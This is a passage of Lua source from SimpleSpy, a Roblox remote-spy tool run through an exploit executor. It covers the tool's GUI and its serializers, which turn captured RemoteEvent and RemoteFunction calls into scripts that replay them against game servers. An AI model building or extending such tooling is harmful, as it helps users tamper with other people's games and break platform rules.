            and relativeP.Y >= 0
        then
            return true
        end
        return false
    end
    
    --- Called when mouse enters SimpleSpy
    function mouseEntered()
        local existingCursor = SimpleSpy2:FindFirstChild("Cursor")
        while existingCursor do
            existingCursor:Destroy()
            existingCursor = SimpleSpy2:FindFirstChild("Cursor")
        end
        local customCursor = Instance.new("ImageLabel")
        customCursor.Name = "Cursor"
        customCursor.Size = UDim2.fromOffset(200, 200)
        customCursor.ZIndex = 1e5
        customCursor.BackgroundTransparency = 1
        customCursor.Image = ""
        customCursor.Parent = SimpleSpy2
        UserInputService.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.ForceHide
        RunService:BindToRenderStep("SIMPLESPY_CURSOR", 1, function()
            if mouseInGui and _G.SimpleSpyExecuted then
                local mouseLocation = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
                customCursor.Position = UDim2.fromOffset(
                    mouseLocation.X - customCursor.AbsoluteSize.X / 2,
                    mouseLocation.Y - customCursor.AbsoluteSize.Y / 2
                )
                local inRange, type = isInResizeRange(mouseLocation)
                if inRange and not sideClosed and not closed then
                    customCursor.Image = type == "B" and "rbxassetid://6065821980"
                        or type == "X" and "rbxassetid://6065821086"
                        or type == "Y" and "rbxassetid://6065821596"
                elseif inRange and not closed and type == "Y" or type == "B" then
                    customCursor.Image = "rbxassetid://6065821596"
                elseif customCursor.Image ~= "rbxassetid://6065775281" then
                    customCursor.Image = "rbxassetid://6065775281"
                end
            else
                UserInputService.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
                customCursor:Destroy()
                RunService:UnbindFromRenderStep("SIMPLESPY_CURSOR")
            end
        end)
    end
    
    --- Called when mouse moves
    function mouseMoved()
        local mousePos = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
        if
            not closed
            and mousePos.X >= TopBar.AbsolutePosition.X
            and mousePos.X <= TopBar.AbsolutePosition.X + TopBar.AbsoluteSize.X
            and mousePos.Y >= Background.AbsolutePosition.Y
            and mousePos.Y <= Background.AbsolutePosition.Y + Background.AbsoluteSize.Y
        then
            if not mouseInGui then
                mouseInGui = true
                mouseEntered()
            end
        else
            mouseInGui = false
        end
    end
    
    --- Adjusts the ui elements to the 'Maximized' size
    function maximizeSize(speed)
        if not speed then
            speed = 0.05
        end
        TweenService
            :Create(
                LeftPanel,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }
            )
            :Play()
        TweenService
            :Create(RightPanel, TweenInfo.new(speed), {
                Size = UDim2.fromOffset(
                    Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X,
                    Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y
                ),
            })
            :Play()
        TweenService
            :Create(
                TopBar,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(Background.AbsoluteSize.X, TopBar.AbsoluteSize.Y) }
            )
            :Play()
        TweenService
            :Create(ScrollingFrame, TweenInfo.new(speed), {
                Size = UDim2.fromOffset(Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X, 110),
                Position = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y),
            })
            :Play()
        TweenService
            :Create(CodeBox, TweenInfo.new(speed), {
                Size = UDim2.fromOffset(
                    Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X,
                    Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y
                ),
            })
            :Play()
        TweenService
            :Create(
                LogList,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(LogList.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y - 18) }
            )
            :Play()
    end
    
    --- Adjusts the ui elements to close the side
    function minimizeSize(speed)
        if not speed then
            speed = 0.05
        end
        TweenService
            :Create(
                LeftPanel,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }
            )
            :Play()
        TweenService
            :Create(
                RightPanel,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(0, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }
            )
            :Play()
        TweenService
            :Create(
                TopBar,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, TopBar.AbsoluteSize.Y) }
            )
            :Play()
        TweenService
            :Create(ScrollingFrame, TweenInfo.new(speed), {
                Size = UDim2.fromOffset(0, 119),
                Position = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y),
            })
            :Play()
        TweenService
            :Create(
                CodeBox,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y) }
            )
            :Play()
        TweenService
            :Create(
                LogList,
                TweenInfo.new(speed),
                { Size = UDim2.fromOffset(LogList.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y - 18) }
            )
            :Play()
    end
    
    --- Ensures size is within screensize limitations
    function validateSize()
        local x, y = Background.AbsoluteSize.X, Background.AbsoluteSize.Y
        local screenSize = workspace.CurrentCamera.ViewportSize
        if x + Background.AbsolutePosition.X > screenSize.X then
            if screenSize.X - Background.AbsolutePosition.X >= 450 then
                x = screenSize.X - Background.AbsolutePosition.X
            else
                x = 450
            end
        elseif y + Background.AbsolutePosition.Y > screenSize.Y then
            if screenSize.X - Background.AbsolutePosition.Y >= 268 then
                y = screenSize.Y - Background.AbsolutePosition.Y
            else
                y = 268
            end
        end
        Background.Size = UDim2.fromOffset(x, y)
    end
    
    --- Called on user input while mouse in 'Background' frame
    --- @param input InputObject
    function backgroundUserInput(input)
        local mousePos = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
        local inResizeRange, type = isInResizeRange(mousePos)
        if input.UserInputType == Enum.UserInputType.MouseButton1 and inResizeRange then
            local lastPos = UserInputService:GetMouseLocation()
            local offset = Background.AbsoluteSize - lastPos
            local currentPos = lastPos + offset
            RunService:BindToRenderStep("SIMPLESPY_RESIZE", 1, function()
                local newPos = UserInputService:GetMouseLocation()
                if newPos ~= lastPos then
                    local currentX = (newPos + offset).X
                    local currentY = (newPos + offset).Y
                    if currentX < 450 then
                        currentX = 450
                    end
                    if currentY < 268 then
                        currentY = 268
                    end
                    currentPos = Vector2.new(currentX, currentY)
                    Background.Size = UDim2.fromOffset(
                        (not sideClosed and not closed and (type == "X" or type == "B")) and currentPos.X
                            or Background.AbsoluteSize.X,
                        (--[[(not sideClosed or currentPos.X <= LeftPanel.AbsolutePosition.X + LeftPanel.AbsoluteSize.X) and]]not closed and (type == "Y" or type == "B"))
                                and currentPos.Y
                            or Background.AbsoluteSize.Y
                    )
                    validateSize()
                    if sideClosed then
                        minimizeSize()
                    else
                        maximizeSize()
                    end
                    lastPos = newPos
                end
            end)
            table.insert(
                connections,
                UserInputService.InputEnded:Connect(function(inputE)
                    if input == inputE then
                        RunService:UnbindFromRenderStep("SIMPLESPY_RESIZE")
                    end
                end)
            )
        elseif isInDragRange(mousePos) then
            onBarInput(input)
        end
    end
    
    --- Gets the player an instance is descended from
    function getPlayerFromInstance(instance)
        for _, v in pairs(Players:GetPlayers()) do
            if v.Character and (instance:IsDescendantOf(v.Character) or instance == v.Character) then
                return v
            end
        end
    end
    
    --- Runs on MouseButton1Click of an event frame
    function eventSelect(frame)
        if selected and selected.Log and selected.Log.Button then
            TweenService
                :Create(selected.Log.Button, TweenInfo.new(0.5), { BackgroundColor3 = Color3.fromRGB(0, 0, 0) })
                :Play()
            selected = nil
        end
        for _, v in pairs(logs) do
            if frame == v.Log then
                selected = v
            end
        end
        if selected and selected.Log then
            TweenService
                :Create(frame.Button, TweenInfo.new(0.5), { BackgroundColor3 = Color3.fromRGB(92, 126, 229) })
                :Play()
            codebox:setRaw(selected.GenScript)
        end
        if sideClosed then
            toggleSideTray()
        end
    end
    
    --- Updates the canvas size to fit the current amount of function buttons
    function updateFunctionCanvas()
        ScrollingFrame.CanvasSize = UDim2.fromOffset(UIGridLayout.AbsoluteContentSize.X, UIGridLayout.AbsoluteContentSize.Y)
    end
    
    --- Updates the canvas size to fit the amount of current remotes
    function updateRemoteCanvas()
        LogList.CanvasSize = UDim2.fromOffset(UIListLayout.AbsoluteContentSize.X, UIListLayout.AbsoluteContentSize.Y)
    end
    
    --- Allows for toggling of the tooltip and easy setting of le description
    --- @param enable boolean
    --- @param text string
    function makeToolTip(enable, text)
        if enable then
            if ToolTip.Visible then
                ToolTip.Visible = false
                RunService:UnbindFromRenderStep("ToolTip")
            end
            local first = true
            RunService:BindToRenderStep("ToolTip", 1, function()
                local topLeft = Vector2.new(Mouse.X + 20, Mouse.Y + 20)
                local bottomRight = topLeft + ToolTip.AbsoluteSize
                if topLeft.X < 0 then
                    topLeft = Vector2.new(0, topLeft.Y)
                elseif bottomRight.X > workspace.CurrentCamera.ViewportSize.X then
                    topLeft = Vector2.new(workspace.CurrentCamera.ViewportSize.X - ToolTip.AbsoluteSize.X, topLeft.Y)
                end
                if topLeft.Y < 0 then
                    topLeft = Vector2.new(topLeft.X, 0)
                elseif bottomRight.Y > workspace.CurrentCamera.ViewportSize.Y - 35 then
                    topLeft = Vector2.new(topLeft.X, workspace.CurrentCamera.ViewportSize.Y - ToolTip.AbsoluteSize.Y - 35)
                end
                if topLeft.X <= Mouse.X and topLeft.Y <= Mouse.Y then
                    topLeft = Vector2.new(Mouse.X - ToolTip.AbsoluteSize.X - 2, Mouse.Y - ToolTip.AbsoluteSize.Y - 2)
                end
                if first then
                    ToolTip.Position = UDim2.fromOffset(topLeft.X, topLeft.Y)
                    first = false
                else
                    ToolTip:TweenPosition(UDim2.fromOffset(topLeft.X, topLeft.Y), "Out", "Linear", 0.1)
                end
            end)
            TextLabel.Text = text
            ToolTip.Visible = true
        else
            if ToolTip.Visible then
                ToolTip.Visible = false
                RunService:UnbindFromRenderStep("ToolTip")
            end
        end
    end
    
    --- Creates new function button (below codebox)
    --- @param name string
    ---@param description function
    ---@param onClick function
    function newButton(name, description, onClick)
        local button = FunctionTemplate:Clone()
        button.Text.Text = name
        button.Button.MouseEnter:Connect(function()
            makeToolTip(true, description())
        end)
        button.Button.MouseLeave:Connect(function()
            makeToolTip(false)
        end)
        button.AncestryChanged:Connect(function()
            makeToolTip(false)
        end)
        button.Button.MouseButton1Click:Connect(function(...)
            onClick(button, ...)
        end)
        button.Parent = ScrollingFrame
        updateFunctionCanvas()
    end
    
    --- Adds new Remote to logs
    --- @param name string The name of the remote being logged
    --- @param type string The type of the remote being logged (either 'function' or 'event')
    --- @param args any
    --- @param remote any
    --- @param function_info string
    --- @param blocked any
    function newRemote(type, name, args, remote, function_info, blocked, src, returnValue)
        local remoteFrame = RemoteTemplate:Clone()
        remoteFrame.Text.Text = string.sub(name, 1, 50)
        remoteFrame.ColorBar.BackgroundColor3 = type == "event" and Color3.new(255, 242, 0) or Color3.fromRGB(99, 86, 245)
        local id = Instance.new("IntValue")
        id.Name = "ID"
        id.Value = #logs + 1
        id.Parent = remoteFrame
        local weakRemoteTable = setmetatable({ remote = remote }, { __mode = "v" })
        local log = {
            Name = name,
            Function = function_info,
            Remote = weakRemoteTable,
            Log = remoteFrame,
            Blocked = blocked,
            Source = src,
            GenScript = "-- Generating, please wait... (click to reload)\n-- (If this message persists, the remote args are likely extremely long)",
            ReturnValue = returnValue,
        }
        logs[#logs + 1] = log
        schedule(function()
            log.GenScript = genScript(remote, args)
            if blocked then
                logs[#logs].GenScript = "-- THIS REMOTE WAS PREVENTED FROM FIRING THE SERVER BY SIMPLESPY\n\n"
                    .. logs[#logs].GenScript
            end
        end)
        local connect = remoteFrame.Button.MouseButton1Click:Connect(function()
            eventSelect(remoteFrame)
        end)
        if layoutOrderNum < 1 then
            layoutOrderNum = 999999999
        end
        remoteFrame.LayoutOrder = layoutOrderNum
        layoutOrderNum = layoutOrderNum - 1
        remoteFrame.Parent = LogList
        table.insert(remoteLogs, 1, { connect, remoteFrame })
        clean()
        updateRemoteCanvas()
    end
    
    --- Generates a script from the provided arguments (first has to be remote path)
    function genScript(remote, args)
        prevTables = {}
        local gen = ""
        if #args > 0 then
            if not pcall(function()
                gen = v2v({ args = args }) .. "\n"
            end) then
                gen = gen
                    .. "-- TableToString failure! Reverting to legacy functionality (results may vary)\nlocal args = {"
                if
                    not pcall(function()
                        for i, v in pairs(args) do
                            if type(i) ~= "Instance" and type(i) ~= "userdata" then
                                gen = gen .. "\n    [object] = "
                            elseif type(i) == "string" then
                                gen = gen .. '\n    ["' .. i .. '"] = '
                            elseif type(i) == "userdata" and typeof(i) ~= "Instance" then
                                gen = gen .. "\n    [" .. string.format("nil --[[%s]]", typeof(v)) .. ")] = "
                            elseif type(i) == "userdata" then
                                gen = gen .. "\n    [game." .. i:GetFullName() .. ")] = "
                            end
                            if type(v) ~= "Instance" and type(v) ~= "userdata" then
                                gen = gen .. "object"
                            elseif type(v) == "string" then
                                gen = gen .. '"' .. v .. '"'
                            elseif type(v) == "userdata" and typeof(v) ~= "Instance" then
                                gen = gen .. string.format("nil --[[%s]]", typeof(v))
                            elseif type(v) == "userdata" then
                                gen = gen .. "game." .. v:GetFullName()
                            end
                        end
                        gen = gen .. "\n}\n\n"
                    end)
                then
                    gen = gen .. "}\n-- Legacy tableToString failure! Unable to decompile."
                end
            end
            if not remote:IsDescendantOf(game) and not getnilrequired then
                gen = "function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end\n\n"
                    .. gen
            end
            if remote:IsA("RemoteEvent") then
                gen = gen .. v2s(remote) .. ":FireServer(unpack(args))"
            elseif remote:IsA("RemoteFunction") then
                gen = gen .. v2s(remote) .. ":InvokeServer(unpack(args))"
            end
        else
            if remote:IsA("RemoteEvent") then
                gen = gen .. v2s(remote) .. ":FireServer()"
            elseif remote:IsA("RemoteFunction") then
                gen = gen .. v2s(remote) .. ":InvokeServer()"
            end
        end
        gen = "-- Script generated by SimpleSpy - credits to peatchXD#6075\n\n" .. gen
        prevTables = {}
        return gen
    end
    
    --- value-to-string: value, string (out), level (indentation), parent table, var name, is from tovar
    function v2s(v, l, p, n, vtv, i, pt, path, tables, tI)
        if not tI then
            tI = { 0 }
        else
            tI[1] += 1
        end
        if typeof(v) == "number" then
            if v == math.huge then
                return "math.huge"
            elseif tostring(v):match("nan") then
                return "0/0 --[[NaN]]"
            end
            return tostring(v)
        elseif typeof(v) == "boolean" then
            return tostring(v)
        elseif typeof(v) == "string" then
            return formatstr(v, l)
        elseif typeof(v) == "function" then
            return f2s(v)
        elseif typeof(v) == "table" then
            return t2s(v, l, p, n, vtv, i, pt, path, tables, tI)
        elseif typeof(v) == "Instance" then
            return i2p(v)
        elseif typeof(v) == "userdata" then
            return "newproxy(true)"
        elseif type(v) == "userdata" then
            return u2s(v)
        elseif type(v) == "vector" then
            return string.format("Vector3.new(%s, %s, %s)", v2s(v.X), v2s(v.Y), v2s(v.Z))
        else
            return "nil --[[" .. typeof(v) .. "]]"
        end
    end
    
    --- value-to-variable
    --- @param t any
    function v2v(t)
        topstr = ""
        bottomstr = ""
        getnilrequired = false
        local ret = ""
        local count = 1
        for i, v in pairs(t) do
            if type(i) == "string" and i:match("^[%a_]+[%w_]*$") then
                ret = ret .. "local " .. i .. " = " .. v2s(v, nil, nil, i, true) .. "\n"
            elseif tostring(i):match("^[%a_]+[%w_]*$") then
                ret = ret
                    .. "local "
                    .. tostring(i):lower()
                    .. "_"
                    .. tostring(count)
                    .. " = "
                    .. v2s(v, nil, nil, tostring(i):lower() .. "_" .. tostring(count), true)
                    .. "\n"
            else
                ret = ret
                    .. "local "
                    .. type(v)
                    .. "_"
                    .. tostring(count)
                    .. " = "
                    .. v2s(v, nil, nil, type(v) .. "_" .. tostring(count), true)
                    .. "\n"
            end
            count = count + 1
        end
        if getnilrequired then
            topstr = "function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end\n"
                .. topstr
        end
        if #topstr > 0 then
            ret = topstr .. "\n" .. ret
        end
        if #bottomstr > 0 then
            ret = ret .. bottomstr
        end
        return ret
    end
    
    --- table-to-string
    --- @param t table
    --- @param l number
    --- @param p table
    --- @param n string
    --- @param vtv boolean
    --- @param i any
    --- @param pt table
    --- @param path string
    --- @param tables table
    --- @param tI table
    function t2s(t, l, p, n, vtv, i, pt, path, tables, tI)
        local globalIndex = table.find(getgenv(), t) -- checks if table is a global
        if type(globalIndex) == "string" then
            return globalIndex
        end
        if not tI then
            tI = { 0 }
        end
        if not path then -- sets path to empty string (so it doesn't have to manually provided every time)
            path = ""
        end
        if not l then -- sets the level to 0 (for indentation) and tables for logging tables it already serialized
            l = 0
            tables = {}
        end
        if not p then -- p is the previous table but doesn't really matter if it's the first
            p = t
        end
        for _, v in pairs(tables) do -- checks if the current table has been serialized before
            if n and rawequal(v, t) then
                bottomstr = bottomstr
                    .. "\n"
                    .. tostring(n)
                    .. tostring(path)
                    .. " = "
                    .. tostring(n)
                    .. tostring(({ v2p(v, p) })[2])
                return "{} --[[DUPLICATE]]"
            end
        end
        table.insert(tables, t) -- logs table to past tables
        local s = "{" -- start of serialization
        local size = 0
        l = l + indent -- set indentation level
        for k, v in pairs(t) do -- iterates over table
            size = size + 1 -- changes size for max limit
            if size > (_G.SimpleSpyMaxTableSize or 1000) then
                s = s
                    .. "\n"
                    .. string.rep(" ", l)
                    .. "-- MAXIMUM TABLE SIZE REACHED, CHANGE '_G.SimpleSpyMaxTableSize' TO ADJUST MAXIMUM SIZE "
                break
            end
            if rawequal(k, t) then -- checks if the table being iterated over is being used as an index within itself (yay, lua)
                bottomstr = bottomstr
                    .. "\n"
                    .. tostring(n)
                    .. tostring(path)
                    .. "["
                    .. tostring(n)
                    .. tostring(path)
                    .. "]"
                    .. " = "
                    .. (
                        rawequal(v, k) and tostring(n) .. tostring(path)
                        or v2s(v, l, p, n, vtv, k, t, path .. "[" .. tostring(n) .. tostring(path) .. "]", tables)
                    )
                size -= 1
                continue
            end
            local currentPath = "" -- initializes the path of 'v' within 't'
            if type(k) == "string" and k:match("^[%a_]+[%w_]*$") then -- cleanly handles table path generation (for the first half)
                currentPath = "." .. k
            else
                currentPath = "[" .. k2s(k, l, p, n, vtv, k, t, path .. currentPath, tables, tI) .. "]"
            end
            if size % 100 == 0 then
                scheduleWait()
            end
            -- actually serializes the member of the table
            s = s
                .. "\n"
                .. string.rep(" ", l)
                .. "["
                .. k2s(k, l, p, n, vtv, k, t, path .. currentPath, tables, tI)
                .. "] = "
                .. v2s(v, l, p, n, vtv, k, t, path .. currentPath, tables, tI)
                .. ","
        end
        if #s > 1 then -- removes the last comma because it looks nicer (no way to tell if it's done 'till it's done so...)
            s = s:sub(1, #s - 1)
        end
        if size > 0 then -- cleanly indents the last curly bracket
            s = s .. "\n" .. string.rep(" ", l - indent)
        end
        return s .. "}"
    end
    
    --- key-to-string
    function k2s(v, ...)
        if keyToString then
            if typeof(v) == "userdata" and getrawmetatable(v) then
                return string.format(
                    '"<void> (%s)" --[[Potentially hidden data (tostring in SimpleSpy:HookRemote/GetRemoteFiredSignal at your own risk)]]',
                    safetostring(v)
                )
            elseif typeof(v) == "userdata" then
                return string.format('"<void> (%s)"', safetostring(v))
            elseif type(v) == "userdata" and typeof(v) ~= "Instance" then
                return string.format('"<%s> (%s)"', typeof(v), tostring(v))
            elseif type(v) == "function" then
                return string.format('"<Function> (%s)"', tostring(v))
            end
        end
        return v2s(v, ...)
    end
    
    --- function-to-string
    function f2s(f)
        for k, x in pairs(getgenv()) do
            local isgucci, gpath
            if rawequal(x, f) then
                isgucci, gpath = true, ""
            elseif type(x) == "table" then
                isgucci, gpath = v2p(f, x)
            end
            if isgucci and type(k) ~= "function" then
                if type(k) == "string" and k:match("^[%a_]+[%w_]*$") then
                    return k .. gpath
                else
                    return "getgenv()[" .. v2s(k) .. "]" .. gpath
                end
            end
        end
        if funcEnabled and debug.getinfo(f).name:match("^[%a_]+[%w_]*$") then
            return "function()end --[[" .. debug.getinfo(f).name .. "]]"
        end
        return "function()end --[[" .. tostring(f) .. "]]"
    end
    
    --- instance-to-path
    --- @param i userdata
    function i2p(i)
        local player = getplayer(i)
        local parent = i
        local out = ""
        if parent == nil then
            return "nil"
        elseif player then
            while true do
                if parent and parent == player.Character then
                    if player == Players.LocalPlayer then
                        return 'game:GetService("Players").LocalPlayer.Character' .. out
                    else
                        return i2p(player) .. ".Character" .. out
                    end
                else
                    if parent.Name:match("[%a_]+[%w+]*") ~= parent.Name then
                        out = ":FindFirstChild(" .. formatstr(parent.Name) .. ")" .. out
                    else
                        out = "." .. parent.Name .. out
                    end
                end
                parent = parent.Parent
            end
        elseif parent ~= game then
            while true do
                if parent and parent.Parent == game then
                    local service = game:FindService(parent.ClassName)
                    if service then
                        if parent.ClassName == "Workspace" then
                            return "workspace" .. out
                        else
                            return 'game:GetService("' .. service.ClassName .. '")' .. out
                        end
                    else
                        if parent.Name:match("[%a_]+[%w_]*") then
                            return "game." .. parent.Name .. out
                        else
                            return "game:FindFirstChild(" .. formatstr(parent.Name) .. ")" .. out
                        end
                    end
                elseif parent.Parent == nil then
                    getnilrequired = true
                    return "getNil(" .. formatstr(parent.Name) .. ', "' .. parent.ClassName .. '")' .. out
                elseif parent == Players.LocalPlayer then
                    out = ".LocalPlayer" .. out
                else
                    if parent.Name:match("[%a_]+[%w_]*") ~= parent.Name then
                        out = ":FindFirstChild(" .. formatstr(parent.Name) .. ")" .. out
                    else
                        out = "." .. parent.Name .. out
                    end
                end
                parent = parent.Parent
            end
        else
            return "game"
        end
    end
    
    --- userdata-to-string: userdata
    --- @param u userdata
    function u2s(u)
        if typeof(u) == "TweenInfo" then
            -- TweenInfo
            return "TweenInfo.new("
                .. tostring(u.Time)
                .. ", Enum.EasingStyle."
                .. tostring(u.EasingStyle)
                .. ", Enum.EasingDirection."
                .. tostring(u.EasingDirection)
                .. ", "
                .. tostring(u.RepeatCount)
                .. ", "
                .. tostring(u.Reverses)
                .. ", "
                .. tostring(u.DelayTime)
                .. ")"
        elseif typeof(u) == "Ray" then
            -- Ray
            return "Ray.new(" .. u2s(u.Origin) .. ", " .. u2s(u.Direction) .. ")"
        elseif typeof(u) == "NumberSequence" then
            -- NumberSequence
            local ret = "NumberSequence.new("
            for i, v in pairs(u.KeyPoints) do
                ret = ret .. tostring(v)
                if i < #u.Keypoints then
                    ret = ret .. ", "
                end
            end
            return ret .. ")"
        elseif typeof(u) == "DockWidgetPluginGuiInfo" then
            -- DockWidgetPluginGuiInfo
            return "DockWidgetPluginGuiInfo.new(Enum.InitialDockState" .. tostring(u) .. ")"
        elseif typeof(u) == "ColorSequence" then
            -- ColorSequence
            local ret = "ColorSequence.new("
            for i, v in pairs(u.KeyPoints) do
                ret = ret .. "Color3.new(" .. tostring(v) .. ")"
                if i < #u.Keypoints then
                    ret = ret .. ", "
                end
            end
            return ret .. ")"
        elseif typeof(u) == "BrickColor" then
            -- BrickColor
            return "BrickColor.new(" .. tostring(u.Number) .. ")"
        elseif typeof(u) == "NumberRange" then
            -- NumberRange
            return "NumberRange.new(" .. tostring(u.Min) .. ", " .. tostring(u.Max) .. ")"
        elseif typeof(u) == "Region3" then
            -- Region3
            local center = u.CFrame.Position
            local size = u.CFrame.Size
            local vector1 = center - size / 2
            local vector2 = center + size / 2
            return "Region3.new(" .. u2s(vector1) .. ", " .. u2s(vector2) .. ")"
        elseif typeof(u) == "Faces" then
            -- Faces
            local faces = {}
            if u.Top then
                table.insert(faces, "Enum.NormalId.Top")
            end
            if u.Bottom then
                table.insert(faces, "Enum.NormalId.Bottom")
            end
            if u.Left then
                table.insert(faces, "Enum.NormalId.Left")
            end
            if u.Right then
                table.insert(faces, "Enum.NormalId.Right")
            end
            if u.Back then
                table.insert(faces, "Enum.NormalId.Back")
            end
            if u.Front then
                table.insert(faces, "Enum.NormalId.Front")
            end
            return "Faces.new(" .. table.concat(faces, ", ") .. ")"
        elseif typeof(u) == "EnumItem" then
            return tostring(u)
        elseif typeof(u) == "Enums" then
            return "Enum"
        elseif typeof(u) == "Enum" then
            return "Enum." .. tostring(u)
        elseif typeof(u) == "RBXScriptSignal" then
            return "nil --[[RBXScriptSignal]]"
        elseif typeof(u) == "Vector3" then
            return string.format("Vector3.new(%s, %s, %s)", v2s(u.X), v2s(u.Y), v2s(u.Z))
        elseif typeof(u) == "CFrame" then
            local xAngle, yAngle, zAngle = u:ToEulerAnglesXYZ()
            return string.format(
                "CFrame.new(%s, %s, %s) * CFrame.Angles(%s, %s, %s)",
                v2s(u.X),
                v2s(u.Y),
                v2s(u.Z),
                v2s(xAngle),
                v2s(yAngle),
                v2s(zAngle)
            )
        elseif typeof(u) == "DockWidgetPluginGuiInfo" then
            return string.format(
                "DockWidgetPluginGuiInfo(%s, %s, %s, %s, %s, %s, %s)",
                "Enum.InitialDockState.Right",
                v2s(u.InitialEnabled),
                v2s(u.InitialEnabledShouldOverrideRestore),
                v2s(u.FloatingXSize),
                v2s(u.FloatingYSize),
                v2s(u.MinWidth),
                v2s(u.MinHeight)
            )
        elseif typeof(u) == "PathWaypoint" then
            return string.format("PathWaypoint.new(%s, %s)", v2s(u.Position), v2s(u.Action))
        elseif typeof(u) == "UDim" then
            return string.format("UDim.new(%s, %s)", v2s(u.Scale), v2s(u.Offset))
        elseif typeof(u) == "UDim2" then
            return string.format(
                "UDim2.new(%s, %s, %s, %s)",
                v2s(u.X.Scale),
                v2s(u.X.Offset),
                v2s(u.Y.Scale),
                v2s(u.Y.Offset)
            )
        elseif typeof(u) == "Rect" then
            return string.format("Rect.new(%s, %s)", v2s(u.Min), v2s(u.Max))
        else
            return string.format("nil --[[%s]]", typeof(u))
        end
    end
    
    --- Gets the player an instance is descended from
    function getplayer(instance)
        for _, v in pairs(Players:GetPlayers()) do
            if v.Character and (instance:IsDescendantOf(v.Character) or instance == v.Character) then
                return v
            end
        end
    end
    
    --- value-to-path (in table)
    function v2p(x, t, path, prev)
        if not path then
            path = ""
        end
        if not prev then
            prev = {}
        end
        if rawequal(x, t) then
            return true, ""
        end
        for i, v in pairs(t) do
            if rawequal(v, x) then
                if type(i) == "string" and i:match("^[%a_]+[%w_]*$") then
                    return true, (path .. "." .. i)
                else
                    return true, (path .. "[" .. v2s(i) .. "]")
                end
            end
            if type(v) == "table" then
                local duplicate = false
                for _, y in pairs(prev) do
                    if rawequal(y, v) then
                        duplicate = true
                    end
                end
                if not duplicate then
                    table.insert(prev, t)
                    local found
                    found, p = v2p(x, v, path, prev)
                    if found then
                        if type(i) == "string" and i:match("^[%a_]+[%w_]*$") then
                            return true, "." .. i .. p
                        else
                            return true, "[" .. v2s(i) .. "]" .. p
                        end
                    end
                end
            end
        end
        return false, ""
    end
    
    --- format s: string, byte encrypt (for weird symbols)
    function formatstr(s, indentation)
        if not indentation then
            indentation = 0
        end
        local handled, reachedMax = handlespecials(s, indentation)
        return '"'
            .. handled
            .. '"'
            .. (
                reachedMax
                    and " --[[ MAXIMUM STRING SIZE REACHED, CHANGE '_G.SimpleSpyMaxStringSize' TO ADJUST MAXIMUM SIZE ]]"
                or ""
            )
    end
    
    --- Adds \'s to the text as a replacement to whitespace chars and other things because string.format can't yayeet
    function handlespecials(value, indentation)
        local buildStr = {}
        local i = 1
        local char = string.sub(value, i, i)
        local indentStr
        while char ~= "" do
            if char == '"' then
                buildStr[i] = '\\"'
            elseif char == "\\" then
                buildStr[i] = "\\\\"
            elseif char == "\n" then
                buildStr[i] = "\\n"
            elseif char == "\t" then
                buildStr[i] = "\\t"
            elseif string.byte(char) > 126 or string.byte(char) < 32 then
                buildStr[i] = string.format("\\%d", string.byte(char))
            else
                buildStr[i] = char
            end
            i = i + 1
            char = string.sub(value, i, i)
            if i % 200 == 0 then
                indentStr = indentStr or string.rep(" ", indentation + indent)
                table.move({ '"\n', indentStr, '... "' }, 1, 3, i, buildStr)
                i += 3
            end
        end
        return table.concat(buildStr)
    end
    
    -- safe (ish) tostring
    function safetostring(v: any)
        if typeof(v) == "userdata" or type(v) == "table" then
            local mt = getrawmetatable(v)
            local badtostring = mt and rawget(mt, "__tostring")
            if mt and badtostring then
                rawset(mt, "__tostring", nil)
                local out = tostring(v)
                rawset(mt, "__tostring", badtostring)
                return out
            end
        end
        return tostring(v)
    end
    
    --- finds script from 'src' from getinfo, returns nil if not found
    --- @param src string
    function getScriptFromSrc(src)
        local realPath
        local runningTest
        --- @type number
        local s, e
        local match = false
        if src:sub(1, 1) == "=" then
            realPath = game
            s = 2
        else
            runningTest = src:sub(2, e and e - 1 or -1)
            for _, v in pairs(getnilinstances()) do
                if v.Name == runningTest then
                    realPath = v
                    break
                end
            end
            s = #runningTest + 1
        end
        if realPath then
            e = src:sub(s, -1):find("%.")
            local i = 0
            repeat
                i += 1
                if not e then
                    runningTest = src:sub(s, -1)
                    local test = realPath.FindFirstChild(realPath, runningTest)
                    if test then
                        realPath = test
                    end
                    match = true
                else
                    runningTest = src:sub(s, e)
                    local test = realPath.FindFirstChild(realPath, runningTest)
                    local yeOld = e
                    if test then
                        realPath = test
                        s = e + 2
                        e = src:sub(e + 2, -1):find("%.")
                        e = e and e + yeOld or e
                    else
                        e = src:sub(e + 2, -1):find("%.")
                        e = e and e + yeOld or e
                    end
                end
            until match or i >= 50
        end
        return realPath
    end
    
    --- schedules the provided function (and calls it with any args after)
    function schedule(f, ...)
        table.insert(scheduled, { f, ... })
    end
    
    --- yields the current thread until the scheduler gives the ok
    function scheduleWait()
        local thread = coroutine.running()
        schedule(function()
            coroutine.resume(thread)
        end)
        coroutine.yield()
    end
